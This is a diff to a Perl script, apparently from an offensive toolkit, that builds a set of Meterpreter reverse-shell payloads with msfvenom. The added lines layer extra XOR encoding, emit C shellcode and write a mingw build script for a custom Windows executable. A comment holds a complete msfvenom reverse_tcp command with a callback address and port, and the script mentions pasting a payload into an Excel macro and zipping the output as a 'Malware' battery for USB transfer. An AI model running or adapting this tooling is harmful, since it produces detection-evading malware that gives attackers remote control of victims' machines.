@@ -123,7 +123,7 @@ use warnings;
   ##
   ##################
 
-  $encoder ='-e x64/xor';
+  $encoder ='-e x64/xor -i 3';
 
   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-Stalwart-BasicMeterpreter-64enc.exe";
   print "\n\n*** Most Basic Meterpreter: $cmd";
@@ -143,6 +143,16 @@ use warnings;
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
+
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-Stalwart-CShellCode-64enc.c";
+  print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
+  `$cmd`;
+  `cp ./inc/meterpreter_x64.c $targetFolder/115-StalwartMeterpreterTemplate.c`;
+  `echo "#!/bin/sh" >$targetFolder/115-StalwartMeterpreterGen.sh`;
+  `echo "x86_64-w64-mingw32-gcc 115-StalwartMeterpreterTemplate.c  -o 115-Stalwart-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-StalwartMeterpreterGen.sh`;
+  `chmod +x i$targetFolder/115-StalwartMeterpreterGen.sh`;
+
+  #Original: msfvenom --platform win -ax86_64 -e x64/xor -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 -f c >shellcode.c 2>&1
 
   `touch $targetFolder/150-Stalwart-RepeatWith915.cue`;
 
@@ -213,7 +223,7 @@ use warnings;
   ##  zip it up for USB/Download fast transfer
   ##
   ##################
-  `zip -r $targetFolder/999-Stalwart-Malware-CurrentBattery.zip $targetFolder/*`;
+#  `zip -r $targetFolder/999-Stalwart-Malware-CurrentBattery.zip $targetFolder/*`;
 
 
 
